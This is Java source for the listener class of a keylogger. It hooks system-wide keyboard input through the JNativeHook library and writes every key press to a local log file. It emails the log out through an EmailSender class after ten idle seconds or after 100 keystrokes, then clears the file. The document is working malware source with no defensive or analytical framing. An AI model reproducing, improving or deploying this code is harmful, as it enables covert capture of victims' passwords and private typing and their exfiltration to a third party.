package KeyListener;

import EmailSender.EmailSender;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class KeyListener implements NativeKeyListener {
    String filename = "keylogger_log.txt";
    FileOutputStream fos;
    EmailSender myEmailSender = new EmailSender();

    int log_counter = 0;
    int seconds_remaining = 0;
    int timer_interval = 10;
    boolean timer_activated = false;

    public KeyListener() {
        File myFile = new File("keylogger_log.txt");
        try {
            boolean result = myFile.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            new FileOutputStream(filename);
            fos = new FileOutputStream(filename, true);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                tick();
            }
        }, 0, 1000);
    }

    public void tick() {
        if (timer_activated) {
            seconds_remaining--;

            if (seconds_remaining == 0) {
                deactivate_timer();
                sendAndClearLog();
            }
        }
    }

    public void activate_timer() {
        seconds_remaining = timer_interval;
        timer_activated = true;

        System.out.println("Activated timer");
    }

    public void deactivate_timer() {
        seconds_remaining = 0;
        timer_activated = false;

        System.out.println("Deactivated timer");
    }

    void reset_timer() {
        seconds_remaining = timer_interval;
        System.out.println("Reset timer");
    }

    void sendAndClearLog() {
        System.out.println("Processing log file...");

        myEmailSender.sendMail(filename);

        try {
            new FileOutputStream(filename);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        log_counter = 0;
        deactivate_timer();

        System.out.println("Log file was sent and cleared.");
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        int pressed_code = nativeKeyEvent.getKeyCode();
        char pressed_char = (char)pressed_code;

        String log_str = pressed_char + " == " + pressed_code + "\n";
        byte[] log_bytes = log_str.getBytes();

        System.out.println("DETECTED KEY PRESS: " + pressed_char + "[" + pressed_code +"]");

        try {
            fos.write(log_bytes);
            log_counter++;
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (timer_activated) {
            reset_timer();
        } else {
            activate_timer();
        }

        if (log_counter >= 100) {
            sendAndClearLog();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}
